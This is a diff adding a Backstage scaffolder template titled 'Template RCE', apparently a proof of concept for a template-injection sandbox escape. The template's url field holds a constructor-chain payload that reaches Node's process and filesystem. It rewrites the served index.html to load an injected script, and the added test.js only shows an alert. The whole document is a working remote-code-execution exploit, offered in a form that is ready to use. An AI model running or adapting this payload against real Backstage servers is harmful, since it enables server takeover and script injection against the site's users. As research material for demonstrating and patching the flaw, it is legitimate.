@@ -1,0 +1,25 @@
+apiVersion: scaffolder.backstage.io/v1beta3
+kind: Template
+metadata:
+  name: template-rce
+  title: Template RCE
+  description: Tempalte that shows a remote code execution
+spec:
+  owner: test-team
+  type: service
+  parameters:
+    - title: Configure Your Service
+      required:
+        - name
+      properties:
+        name:
+          type: string
+          title: Name
+          description: The name of the component
+          default: my-example-component
+       
+  steps:
+    - name: Render Template
+      action: fetch:plain
+      input:
+        url: ${{({}).constructor.__proto__.constructor("const fs = global.process.mainModule.require('fs'); fs.writeFileSync('./packages/app/dist/index.html', fs.readFileSync('./packages/app/dist/index.html', 'utf-8').replace('</head>', '<script src=\"/test.js\"></script></head>'));fs.writeFileSync('./packages/app/dist/test.js', 'alert(`TEST`);');")()}}
